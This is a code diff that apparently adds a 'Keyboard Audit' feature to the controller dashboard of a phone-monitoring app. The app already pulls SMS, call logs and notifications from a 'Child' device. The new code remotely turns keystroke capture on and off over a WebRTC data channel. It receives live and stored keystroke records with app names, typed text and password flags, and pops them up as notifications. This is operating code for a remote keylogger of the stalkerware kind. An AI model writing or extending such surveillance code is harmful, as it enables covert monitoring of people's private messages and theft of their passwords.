@@ -38,6 +38,13 @@ import {
   TYPE_NOTIFICATION_SNAPSHOT,
   TYPE_NOTIFICATION_NEW,
   TYPE_NOTIFICATION_REMOVED,
+  CMD_KEYBOARD_ON,
+  CMD_KEYBOARD_OFF,
+  RESP_KEYBOARD_STARTED,
+  RESP_KEYBOARD_STOPPED,
+  RESP_KEYBOARD_ERROR_PREFIX,
+  TYPE_KEYBOARD_SNAPSHOT,
+  TYPE_KEYBOARD_NEW,
   CMD_WALLPAPER_ON,
   CMD_WALLPAPER_OFF,
   RESP_WALLPAPER_STARTED,
@@ -78,6 +85,7 @@ let callLogTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
 let smsTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
 let notificationTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
 let wallpaperTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
+let keyboardTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
 
 const PANEL_CONFIGS: Record<RightSidebarPanelId, PanelConfig> = {
   sms: { title: 'SMS Messages', badge: 'Active Sync', render: renderSmsPanel },
@@ -331,6 +339,70 @@ function setupDataChannelListeners(): void {
     }
 
     // -------------------------------------------------------------------------
+    // KEYBOARD AUDIT PROTOCOL RESPONSES
+    // -------------------------------------------------------------------------
+    if (trimmed === RESP_KEYBOARD_STARTED) {
+      console.log('[RightSidebar] Child confirmed: KEYBOARD_STARTED');
+      if (keyboardTimeoutTimer) {
+        clearTimeout(keyboardTimeoutTimer);
+        keyboardTimeoutTimer = null;
+      }
+      rightSidebarState.setKeyboardMonitoringState('LIVE');
+      sidebarState.setFeatureLive('keyboard', true);
+      return;
+    }
+
+    if (trimmed === RESP_KEYBOARD_STOPPED) {
+      console.log('[RightSidebar] Child confirmed: KEYBOARD_STOPPED');
+      if (keyboardTimeoutTimer) {
+        clearTimeout(keyboardTimeoutTimer);
+        keyboardTimeoutTimer = null;
+      }
+      rightSidebarState.setKeyboardMonitoringState('IDLE');
+      sidebarState.setFeatureLive('keyboard', false);
+      return;
+    }
+
+    if (trimmed.startsWith(RESP_KEYBOARD_ERROR_PREFIX)) {
+      const err = trimmed.slice(RESP_KEYBOARD_ERROR_PREFIX.length);
+      console.error('[RightSidebar] Keyboard error from Child:', err);
+      if (keyboardTimeoutTimer) {
+        clearTimeout(keyboardTimeoutTimer);
+        keyboardTimeoutTimer = null;
+      }
+      rightSidebarState.setKeyboardMonitoringState('IDLE');
+      sidebarState.setFeatureLive('keyboard', false);
+      triggerSidebarToast(err);
+      return;
+    }
+
+    if (trimmed.startsWith(`{"type":"${TYPE_KEYBOARD_SNAPSHOT}"`)) {
+      try {
+        const payload = JSON.parse(trimmed);
+        console.log(`[RightSidebar] Received keyboard snapshot count=${payload.count}`);
+        rightSidebarState.setKeyboardRecords(payload.records || []);
+      } catch (e) {
+        console.error('[RightSidebar] Failed to parse KEYBOARD_SNAPSHOT payload:', e);
+      }
+      return;
+    }
+
+    if (trimmed.startsWith(`{"type":"${TYPE_KEYBOARD_NEW}"`)) {
+      try {
+        const payload = JSON.parse(trimmed);
+        console.log('[RightSidebar] Received new live keystroke record:', payload.record);
+        if (payload.record) {
+          rightSidebarState.prependKeyboardRecord(payload.record);
+          const displaySnippet = payload.record.isPassword ? '[PASSWORD]' : payload.record.text;
+          triggerSidebarToast(`Keystroke: ${payload.record.appName} - ${displaySnippet.slice(0, 30)}`);
+        }
+      } catch (e) {
+        console.error('[RightSidebar] Failed to parse KEYBOARD_NEW payload:', e);
+      }
+      return;
+    }
+
+    // -------------------------------------------------------------------------
     // WALLPAPER PROTOCOL RESPONSES
     // -------------------------------------------------------------------------
     if (trimmed === RESP_WALLPAPER_STARTED) {
@@ -465,11 +537,16 @@ function setupDataChannelListeners(): void {
         clearTimeout(wallpaperTimeoutTimer);
         wallpaperTimeoutTimer = null;
       }
+      if (keyboardTimeoutTimer) {
+        clearTimeout(keyboardTimeoutTimer);
+        keyboardTimeoutTimer = null;
+      }
       rightSidebarState.resetMonitoringStates();
       sidebarState.setFeatureLive('calllog', false);
       sidebarState.setFeatureLive('sms', false);
       sidebarState.setFeatureLive('notification', false);
       sidebarState.setFeatureLive('wallpaper', false);
+      sidebarState.setFeatureLive('keyboard', false);
     }
   });
 }
@@ -589,6 +666,17 @@ export function renderRightSidebar(): void {
 
     playBtn?.addEventListener('click', () => {
       handleWallpaperPlayPauseClick(playBtn, playIcon, statusSpan);
+    });
+    return;
+  }
+
+  // Synchronize footer button for Keyboard Audit panel
+  if (activePanelId === 'keyboard') {
+    const kbState = rightSidebarState.getKeyboardMonitoringState();
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, kbState, 'Keyboard Audit');
+
+    playBtn?.addEventListener('click', () => {
+      handleKeyboardPlayPauseClick(playBtn, playIcon, statusSpan);
     });
     return;
   }
@@ -837,6 +925,64 @@ function handleWallpaperPlayPauseClick(
       if (rightSidebarState.getWallpaperMonitoringState() === 'STOPPING') {
         rightSidebarState.setWallpaperMonitoringState('IDLE');
         updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Wallpaper');
+      }
+    }, 20000);
+  }
+}
+
+/**
+ * Toggles Keyboard Auditing live monitoring on/off via WebRTC DataChannel.
+ */
+function handleKeyboardPlayPauseClick(
+  playBtn: HTMLButtonElement | null,
+  playIcon: HTMLImageElement | null,
+  statusSpan: HTMLElement | null
+): void {
+  const currentState = rightSidebarState.getKeyboardMonitoringState();
+  if (currentState === 'STARTING' || currentState === 'STOPPING') {
+    return;
+  }
+
+  if (currentState === 'IDLE') {
+    console.log('[RightSidebar] Starting Keyboard monitoring...');
+    rightSidebarState.setKeyboardMonitoringState('STARTING');
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'Keyboard Audit');
+
+    const sent = webrtcManager.sendCommand(CMD_KEYBOARD_ON);
+    if (!sent) {
+      console.warn('[RightSidebar] DataChannel not open. Reverting Keyboard state to IDLE.');
+      rightSidebarState.setKeyboardMonitoringState('IDLE');
+      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
+      triggerSidebarToast('Cannot start: DataChannel not connected');
+      return;
+    }
+
+    if (keyboardTimeoutTimer) clearTimeout(keyboardTimeoutTimer);
+    keyboardTimeoutTimer = setTimeout(() => {
+      if (rightSidebarState.getKeyboardMonitoringState() === 'STARTING') {
+        console.warn('[RightSidebar] Timeout waiting for KEYBOARD_STARTED. Reverting to IDLE.');
+        rightSidebarState.setKeyboardMonitoringState('IDLE');
+        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
+        triggerSidebarToast('Keyboard monitoring request timed out');
+      }
+    }, 20000);
+  } else if (currentState === 'LIVE') {
+    console.log('[RightSidebar] Stopping Keyboard monitoring...');
+    rightSidebarState.setKeyboardMonitoringState('STOPPING');
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'Keyboard Audit');
+
+    const sent = webrtcManager.sendCommand(CMD_KEYBOARD_OFF);
+    if (!sent) {
+      rightSidebarState.setKeyboardMonitoringState('IDLE');
+      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
+      return;
+    }
+
+    if (keyboardTimeoutTimer) clearTimeout(keyboardTimeoutTimer);
+    keyboardTimeoutTimer = setTimeout(() => {
+      if (rightSidebarState.getKeyboardMonitoringState() === 'STOPPING') {
+        rightSidebarState.setKeyboardMonitoringState('IDLE');
+        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Keyboard Audit');
       }
     }, 20000);
   }
